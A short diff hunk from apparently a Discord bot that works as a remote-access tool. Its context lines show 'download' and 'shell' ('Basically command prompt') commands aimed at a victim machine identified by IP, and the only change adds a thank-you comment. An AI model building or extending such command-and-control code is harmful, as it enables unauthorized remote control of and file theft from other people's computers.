@@ -159,6 +159,7 @@ async def download(ctx, IP, file):
         await ctx.send(embed = ErrorMsg())
 
 # Basically command prompt
+# Thank you Sp00p
 @client.command()
 async def shell(ctx, IP, msg):  
     if IP == GetIP():
